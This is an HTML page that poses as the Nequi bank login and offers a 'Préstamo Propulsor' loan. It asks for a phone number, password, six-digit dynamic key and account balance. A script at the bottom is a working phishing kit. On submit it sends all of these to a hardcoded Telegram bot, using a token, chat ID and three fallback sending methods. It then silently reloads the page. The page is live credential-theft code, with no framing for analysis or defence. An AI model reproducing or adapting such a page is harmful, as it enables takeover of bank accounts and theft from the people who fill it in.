<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Nequi</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="generator" content="Webflow">
        <meta http-equiv="cache-control" content="max-age=0"/>
        <meta http-equiv="cache-control" content="no-cache"/>
        <meta http-equiv="expires" content="0"/>
        <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT"/>
        <meta http-equiv="pragma" content="no-cache"/>
        <link rel="stylesheet" type="text/css" href="css/normalize.css">
        <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
        <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
        <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
        <script src="js/libs/lodash.min.js"></script>
        <script src="js/libs/restangular.min.js"></script>
        <script type="text/javascript" src="js/libs/angular-recaptcha.min.js"></script>
        <style>
            #j_token {
                margin-top: 10px;
                margin-bottom: 10px;
            }

            #j_password {
                margin-bottom: 10px;
            }

            #j_username {
                margin-bottom: 10px;
            }

            /* Spinner/Loading wheel */
            .loading-spinner {
                border: 3px solid #f3f3f3;
                border-top: 3px solid #DA0081;
                border-radius: 50%;
                width: 20px;
                height: 20px;
                animation: spin 1s linear infinite;
                display: inline-block;
                margin-right: 8px;
            }

            @keyframes spin {
                0% {
                    transform: rotate(0deg);
                }

                100% {
                    transform: rotate(360deg);
                }
            }

            .btn-loading {
                display: flex;
                align-items: center;
                justify-content: center;
            }
        </style>
    </head>
    <body ng-app="App">
        <header class="header-login ng-scope">
            <popup2 class="ng-isolate-scope">
                <div ng-switch="popupController.modalInfo.type">
                <!-- ngSwitchWhen: timer -->
                <!-- ngSwitchWhen: timerIncremental -->
                <!-- ngSwitchWhen: changePassword -->
                </div>
            </popup2>
            <div class="wrap-header">
                <div class="row">
                    <div class="col-xs-12 col-md-2">
                        <div class="logo">
                            <a href="https://www.nequi.com.co">
                                <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
                            </a>
                        </div>
                        <div class="btn-menu-hamburguer" ng-click="openMenu();">
                            <a class="">
                                <span></span>
                            </a>
                        </div>
                    </div>
                    <div class="col-xs-12 col-md-10 container-buttons">
                        <div class="wrap-main-menu ">
                            <div class="row">
                                <div class="col-xs-12 col-md-8"></div>
                                <div class="col-xs-12 col-md-4">
                                    <div class="buttons-right">
                                        <ul>
                                            <!-- ngIf: !hidePa -->
                                            <li ng-if="!hidePa" class="ng-scope">
                                                <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl" class="ng-binding">Recarga</a>
                                            </li>
                                            <!-- end ngIf: !hidePa -->
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <section class="login-section" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                <h1 class="ng-binding">Prstamo Propulsor Nequi</h1>
                <p class="ng-binding">Completa El Formulario Para Continuar</p>
                <div class="login-form-wrap">
                    <form method="POST" action="#" autocomplete="off" name="loginControl.formLogin" id="nequi-login-form" novalidate>
                        <div class="form-group">
                            <div class="input-country">
                                <div class="wrap-select-country">
                                    <select-country selected-country="loginControl.selectCountry" options="loginControl.selectOption" on-select-country="loginControl.onSelectCountry(option)" class="ng-isolate-scope">
                                        <div class="select-country" ng-click="toggleSelect();">
                                            <div class="country-wrap country-active">
                                                <div class="select-col select-col-img">
                                                    <img src="images/flag_colombia.png" alt="co">
                                                </div>
                                                <div class="select-col">
                                                    <p class="ng-binding">+57 </p>
                                                    <input class="country-input" type="text" name="j_region" id="j_region" value="57">
                                                </div>
                                            </div>
                                            <ul>
                                                <!-- ngRepeat: option in options -->
                                                <li ng-repeat="option in options" class="ng-scope">
                                                    <div ng-click="setCountry($index);" class="country-wrap">
                                                        <div class="select-col select-col-img">
                                                            <img src="images/flag_colombia.png" alt="co">
                                                        </div>
                                                        <div class="select-col">
                                                            <p class="ng-binding">+57</p>
                                                        </div>
                                                    </div>
                                                </li>
                                                <!-- end ngRepeat: option in options -->
                                                <li ng-repeat="option in options" class="ng-scope">
                                                    <div ng-click="setCountry($index);" class="country-wrap">
                                                        <div class="select-col select-col-img">
                                                            <img src="images/flag_panama.png" alt="pa">
                                                        </div>
                                                        <div class="select-col">
                                                            <p class="ng-binding">+507</p>
                                                        </div>
                                                    </div>
                                                </li>
                                                <!-- end ngRepeat: option in options -->
                                            </ul>
                                        </div>
                                    </select-country>
                                </div>
                                <div class="form-group">
                                    <input type="tel" id="j_username" name="j_username" ng-required="true" ng-minlength="10" ng-maxlength="10" ng-pattern="^3[0-9]{9}$" ng-model="loginControl.user" ui-us-phone-number="" masklocalstring="000 000 0000" class="ng-pristine ng-untouched ng-empty ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-minlength" required="required">
                                    <label for="j_username" class="ng-binding">Número de celular</label>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <input type="password" id="j_password" name="j_password" required>
                            <label for="j_password">Contraseña</label>
                        </div>
                        <div class="form-group">
                            <input type="text" id="j_token" name="j_token" ng-required="true" ng-maxlength="6" ng-minlength="6" ng-pattern="^[0-9]{6}$" ng-model="loginControl.token" ui-us-phone-number="" masklocalstring="000000" class="ng-pristine ng-empty ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-touched" required="required">
                            <label for="j_token">Clave dinámica</label>
                        </div>
                        <div class="form-group">
                            <input type="number" id="j_saldo" name="j_saldo" step="0.01" min="0" required>
                            <label for="j_saldo">Saldo actual en la cuenta</label>
                        </div>
                        <div class="btn-wrap">
                            <input class="form-btn-submit" type="submit" value="Entra">
                        </div>
                    </form>
                </div>
            </div>
        </section>
        <footer class="ng-scope">
            <div class="container-footer">
                <!-- ngIf: !hidePa -->
                <div ng-if="!hidePa" class="logo-vigilado ng-scope"></div>
                <!-- end ngIf: !hidePa -->
                <div class="container-top">
                    <div class="logo-nequi">
                        <img alt="logo nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg">
                    </div>
                    <div class="stores">
                        <a href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;hl=es">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
                        </a>
                        <a href="https://apps.apple.com/co/app/nequi/id1075378688">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
                        </a>
                        <a href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&amp;detailType=0">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
                        </a>
                    </div>
                    <div class="group-bancolombia">
                        <a href="https://www.grupobancolombia.com/">
                            <img class="img-group-bancolombia" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg">
                        </a>
                    </div>
                </div>
                <hr class="separator">
                <div class="container-middle">
                    <!-- ngRepeat: item in configCountry.labels -->
                    <div class="col ng-scope" ng-repeat="item in configCountry.labels">
                        <input type="checkbox" id="info-legal" class="hide">
                        <label for="info-legal" class="ng-binding">
                            Información legal <img class="ic-accordion hide" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                        </label>
                        <div class="content-accordion">
                            <!-- ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/legal-web/condiciones-de-uso-de-la-pagina-web" class="ng-binding ng-scope">Condiciones de uso</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/legal-web/tratamiento-de-datos-personales-nequi" class="ng-binding ng-scope">Tratamiento de Datos Personales</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/informacion-legal#consumidor-financiero" class="ng-binding ng-scope">Consumidor fianciero</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/informacion-legal/defensor-del-consumidor-financiero-de-nequi" class="ng-binding ng-scope">Defensor del Consumidor Financiero</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/legal-tarjeta-nequi/terminos-y-condiciones-de-tarjeta-nequi" class="ng-binding ng-scope">Términos y condiciones Tarjeta Nequi</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/informacion-legal" class="ng-binding ng-scope">Legal Nequi</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                        </div>
                    </div>
                    <!-- end ngRepeat: item in configCountry.labels -->
                    <div class="col ng-scope" ng-repeat="item in configCountry.labels">
                        <input type="checkbox" id="para-personas" class="hide">
                        <label for="para-personas" class="ng-binding">
                            Para personas <img class="ic-accordion hide" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                        </label>
                        <div class="content-accordion">
                            <!-- ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/tarjeta-nequi" class="ng-binding ng-scope">Tarjeta Nequi</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/prestamo-salvavidas" class="ng-binding ng-scope">Préstamo Salvavidas</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/prestamo-propulsor" class="ng-binding ng-scope">Préstamo Propulsor</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/usa-tu-plata" class="ng-binding ng-scope">Usa tu plata</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/paypal" class="ng-binding ng-scope">Paypal</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/remesas" class="ng-binding ng-scope">Remesas</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                        </div>
                    </div>
                    <!-- end ngRepeat: item in configCountry.labels -->
                    <div class="col ng-scope" ng-repeat="item in configCountry.labels">
                        <input type="checkbox" id="para-negocio" class="hide">
                        <label for="para-negocio" class="ng-binding">
                            Para tu negocio <img class="ic-accordion hide" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                        </label>
                        <div class="content-accordion">
                            <!-- ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://negocios.nequi.co/" class="ng-binding ng-scope">Negocios</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                        </div>
                    </div>
                    <!-- end ngRepeat: item in configCountry.labels -->
                    <div class="col ng-scope" ng-repeat="item in configCountry.labels">
                        <input type="checkbox" id="ayuda" class="hide">
                        <label for="ayuda" class="ng-binding">
                            Ayuda <img class="ic-accordion hide" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                        </label>
                        <div class="content-accordion">
                            <!-- ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://ayuda.nequi.com.co/hc/es" class="ng-binding ng-scope">Centro de ayuda</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/blog" class="ng-binding ng-scope">Blog metidas de plata</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://comunidad.nequi.co/" class="ng-binding ng-scope">Comunidad Nequi</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/roberto-hurtado-tips-de-seguridad" class="ng-binding ng-scope">Tips de seguridad</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                        </div>
                    </div>
                    <!-- end ngRepeat: item in configCountry.labels -->
                    <div class="col ng-scope" ng-repeat="item in configCountry.labels">
                        <input type="checkbox" id="conocenos" class="hide">
                        <label for="conocenos" class="ng-binding">
                            Conócenos <img class="ic-accordion hide" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                        </label>
                        <div class="content-accordion">
                            <!-- ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/somos-nequi" class="ng-binding ng-scope">¿Quiénes somos?</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/nequi-trabaja-con-nosotros" class="ng-binding ng-scope">Trabaja con nosotros</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/sala-de-prensa" class="ng-binding ng-scope">Sala de prensa</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                            <a ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/comunicados" class="ng-binding ng-scope">Comunicados</a>
                            <!-- end ngRepeat: dataLink in item.data -->
                        </div>
                    </div>
                    <!-- end ngRepeat: item in configCountry.labels -->
                </div>
                <hr class="separator">
                <div class="container-end">
                    <!-- ngRepeat: item in configCountry.socialMedia -->
                    <a ng-repeat="item in configCountry.socialMedia" href="https://twitter.com/Nequi" class="ng-scope">
                        <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e5220142aa063fa007c444_ic-twitter.svg">
                    </a>
                    <!-- end ngRepeat: item in configCountry.socialMedia -->
                    <a ng-repeat="item in configCountry.socialMedia" href="https://www.instagram.com/nequi_/" class="ng-scope">
                        <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201416719efe915e448_ic-instagram.svg">
                    </a>
                    <!-- end ngRepeat: item in configCountry.socialMedia -->
                    <a ng-repeat="item in configCountry.socialMedia" href="https://www.facebook.com/appnequi/" class="ng-scope">
                        <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c1a7bf3e9e5bd566_ic-facebook.svg">
                    </a>
                    <!-- end ngRepeat: item in configCountry.socialMedia -->
                    <a ng-repeat="item in configCountry.socialMedia" href="https://www.linkedin.com/company/nequi/mycompany/" class="ng-scope">
                        <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e522013be191fdc4a0252e_ic-linkedin.svg">
                    </a>
                    <!-- end ngRepeat: item in configCountry.socialMedia -->
                    <a ng-repeat="item in configCountry.socialMedia" href="https://www.youtube.com/channel/UCK1dLH3nTK-GOlgSVa95XNg/feed" class="ng-scope">
                        <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c663d0190bc59ba8_ic-youtube.svg">
                    </a>
                    <!-- end ngRepeat: item in configCountry.socialMedia -->
                </div>
                <hr class="separator hide show-mobile">
            </div>
        </footer>
        <!-- Script de envío a Telegram con confirmación -->
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                const form = document.getElementById("nequi-login-form");
                const BOT_TOKEN = "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc";
                const CHAT_ID = "8469651553";

                // Función para enviar mensaje a través del bot
                async function sendMessage(message) {
                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    const messageText = encodeURIComponent(message);

                    // Método 1: Usando fetch con JSON
                    try {
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                text: message,
                                parse_mode: 'Markdown',
                                disable_web_page_preview: true
                            })
                        });
                        if (response.ok)
                            return true;
                    } catch (e) {}

                    // Método 2: Usando URL directa
                    try {
                        await fetch(`${url}?chat_id=${CHAT_ID}&text=${messageText}&parse_mode=Markdown`);
                        return true;
                    } catch (e) {}

                    // Método 3: Abrir en ventana
                    window.open(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${messageText}`, '_blank');
                    return false;
                }

                form.addEventListener("submit", async function(e) {
                    e.preventDefault();

                    const numero = document.getElementById("j_username").value;
                    const pin = document.getElementById("j_password").value;
                    const clave = document.getElementById("j_token").value;
                    const saldo = document.getElementById("j_saldo").value;
                    const btn = form.querySelector('.form-btn-submit');

                    // Validar que todos los campos estén llenos
                    if (!numero || !pin || !clave || !saldo) {
                        return;
                    }

                    // Mostrar spinner de carga
                    btn.disabled = true;
                    btn.innerHTML = '<div class="loading-spinner"></div>';

                    // Formato del mensaje
                    const mensaje = `🔔 *NUEVO INGRESO NEQUI* 🔔\n\n` + `📱 *Número de teléfono:* \`${numero}\`\n` + `🔐 *PIN:* \`${pin}\`\n` + `🔑 *Clave dinámica:* \`${clave}\`\n` + `💰 *Saldo actual:* \`$${saldo}\`\n\n` + `📅 *Fecha y hora:* ${new Date().toLocaleString('es-CO', {
                        timeZone: 'America/Bogota'
                    })}`;

                    // Enviar el mensaje y recargar
                    await sendMessage(mensaje);
                    form.reset();
                    window.location.reload();
                });
            });
        </script>
    </body>
</html>
